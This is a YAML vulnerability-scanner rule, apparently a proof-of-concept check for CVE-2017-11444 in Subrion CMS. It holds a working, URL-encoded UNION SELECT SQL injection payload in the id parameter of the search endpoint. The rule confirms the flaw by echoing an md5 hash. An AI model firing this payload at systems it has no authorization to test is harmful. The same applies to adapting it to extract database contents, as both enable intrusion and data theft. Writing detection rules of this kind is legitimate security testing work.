name: poc-yaml-subrions-search-cve-2017-11444-sqli
manual: true
transport: http
set:
    rand: randomInt(200000000, 210000000)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /search/members.json?id%60%3D-1%29%2f%2a%2a%2funion%2f%2a1%2a%2fselect%2f%2a%2a%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cmd5({{rand}})%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%231=1
        expression: |
            response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
expression: r1()
detail:
    author: corp0ra1
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11444
    vulnerability:
        id: CT-108540
        level: critical
